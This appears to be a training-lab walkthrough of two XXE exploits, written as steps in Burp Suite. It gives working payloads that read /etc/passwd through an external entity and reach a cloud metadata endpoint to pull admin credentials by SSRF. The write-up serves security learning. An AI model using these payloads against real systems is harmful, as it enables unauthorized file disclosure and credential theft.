Task 1:
///Lab: Exploiting XXE using external entities to retrieve files///

Open the site in burpsuite, click one of the products and check the stock. After this switch to burpsuite-s window, and check http history.
There should be a Post request called /product/stock. Send this request to repeater.
At the end of the request you can see this:
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
This is the part when the front end (your browser) asks down the data from the backend (server) through xml.
But if its not configured well, like in this lab, we can create "entities", and get more data from the server like it should allow.
This is how...Change those lines like this:ű

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
Send, and we solved the lab. In the response you can see the file's data.

Task 2:
///Lab: Exploiting XXE to perform SSRF attacks///

Just like in task 1, open the lab in burp, check one of the products id, and in burpsuite send the post request to repeater.
The end of the request is the same:
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
And we have to modify with <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>, but this time we got a hint: "metadata endpoint at the default URL, which is http://169.254.169.254/"
So modify the line like: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> , change productId to &xxe; just like before and send it...in the response you will see something like: "Invalid product ID: latest"
Copy this into our payload: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]> and send it. and keep following the same until you get the admin's data.

